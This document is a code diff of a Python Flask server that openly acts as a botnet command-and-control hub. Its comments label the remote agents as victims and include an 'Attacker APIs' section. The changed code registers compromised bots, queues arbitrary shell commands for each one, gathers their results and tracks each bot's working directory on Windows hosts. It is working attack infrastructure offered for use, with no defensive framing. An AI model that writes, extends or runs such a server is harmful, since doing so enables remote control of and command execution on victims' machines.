@@ -1,16 +1,14 @@
 from flask import Flask, request, jsonify, render_template_string
 import time
 import json
-import threading
-import uuid
 
 app = Flask(__name__)
 
-# ===== قاعدة بيانات بسيطة فـ الذاكرة =====
-bots = {}          # bot_id -> {"ip": ip, "last_seen": time}
-sessions = {}      # session_id -> {"bot_id": bot_id, "commands": [], "results": []}
+# قاعدة بيانات بسيطة
+bots = {}          # bot_id -> {"ip": ip, "last_seen": time, "cwd": path}
+commands = {}      # bot_id -> [list of commands]
+results = {}       # bot_id -> [list of results]
 
-# ===== صفحة ويب بسيطة =====
 @app.route('/')
 def index():
     return """
@@ -35,31 +33,37 @@ def index():
     </html>
     """
 
-# ===== APIs للـ Agent (الضحية) =====
+# ===== الـ Agent APIs =====
 @app.route('/register', methods=['POST'])
 def register():
     data = request.json
-    bot_id = data.get('id', str(uuid.uuid4())[:8])
-    bots[bot_id] = {
-        "ip": request.remote_addr,
-        "last_seen": time.time()
-    }
-    return jsonify({"status": "ok", "bot_id": bot_id})
+    bot_id = data.get('id')
+    if bot_id:
+        bots[bot_id] = {
+            "ip": request.remote_addr,
+            "last_seen": time.time(),
+            "cwd": "C:\\"
+        }
+        if bot_id not in commands:
+            commands[bot_id] = []
+        if bot_id not in results:
+            results[bot_id] = []
+        return jsonify({"status": "ok"})
+    return jsonify({"status": "error"}), 400
 
 @app.route('/get_command/<bot_id>', methods=['GET'])
 def get_command(bot_id):
     if bot_id not in bots:
         return jsonify({"command": ""})
     
-    # نبحث عن أي أمر مرتبط بهذا البوت
-    for session_id, session in sessions.items():
-        if session.get("bot_id") == bot_id:
-            if session.get("commands"):
-                cmd = session["commands"].pop(0)
-                bots[bot_id]["last_seen"] = time.time()
-                return jsonify({"command": cmd})
-    
+    # نجدد آخر ظهور
     bots[bot_id]["last_seen"] = time.time()
+    
+    # نبحث عن أمر
+    if bot_id in commands and commands[bot_id]:
+        cmd = commands[bot_id].pop(0)
+        return jsonify({"command": cmd})
+    
     return jsonify({"command": ""})
 
 @app.route('/send_result', methods=['POST'])
@@ -67,15 +71,19 @@ def send_result():
     data = request.json
     bot_id = data.get('bot_id')
     result = data.get('result', '')
+    new_cwd = data.get('cwd', '')
     
-    for session_id, session in sessions.items():
-        if session.get("bot_id") == bot_id:
-            session["results"].append(result)
-            break
+    if bot_id:
+        if bot_id in results:
+            results[bot_id].append(result)
+        if bot_id in bots and new_cwd:
+            bots[bot_id]["cwd"] = new_cwd
+        if bot_id in bots:
+            bots[bot_id]["last_seen"] = time.time()
     
     return jsonify({"status": "ok"})
 
-# ===== APIs للـ Attacker (أداة CLI) =====
+# ===== Attacker APIs =====
 @app.route('/api/list_bots', methods=['GET'])
 def list_bots():
     now = time.time()
@@ -85,48 +93,35 @@ def list_bots():
             active.append({
                 "id": bot_id,
                 "ip": info["ip"],
+                "cwd": info.get("cwd", "C:\\"),
                 "last_seen": info["last_seen"]
             })
     return jsonify(active)
 
-@app.route('/api/start_session', methods=['POST'])
-def start_session():
+@app.route('/api/send_cmd', methods=['POST'])
+def send_cmd():
     data = request.json
     bot_id = data.get('bot_id')
+    cmd = data.get('cmd')
     
     if bot_id not in bots:
         return jsonify({"status": "error", "message": "Bot not found"}), 404
     
-    session_id = str(uuid.uuid4())[:8]
-    sessions[session_id] = {
-        "bot_id": bot_id,
-        "commands": [],
-        "results": []
-    }
+    if bot_id not in commands:
+        commands[bot_id] = []
     
-    return jsonify({"status": "ok", "session_id": session_id})
+    commands[bot_id].append(cmd)
+    return jsonify({"status": "ok", "message": "Command queued"})
 
-@app.route('/api/send_command', methods=['POST'])
-def send_command():
-    data = request.json
-    session_id = data.get('session_id')
-    command = data.get('command')
-    
-    if session_id not in sessions:
-        return jsonify({"status": "error", "message": "Session not found"}), 404
-    
-    sessions[session_id]["commands"].append(command)
-    return jsonify({"status": "ok"})
-
-@app.route('/api/get_results/<session_id>', methods=['GET'])
-def get_results(session_id):
-    if session_id not in sessions:
+@app.route('/api/get_result/<bot_id>', methods=['GET'])
+def get_result(bot_id):
+    if bot_id not in results:
         return jsonify({"results": []})
     
-    results = sessions[session_id]["results"]
-    sessions[session_id]["results"] = []  # نمسح النتائج بعد جلبها
-    return jsonify({"results": results})
+    # نجيب النتائج ونمسحهم
+    res = results[bot_id].copy()
+    results[bot_id] = []
+    return jsonify({"results": res})
 
 if __name__ == '__main__':
-    # 🔥 Zidna threaded=True باش يزيد السرعة
     app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
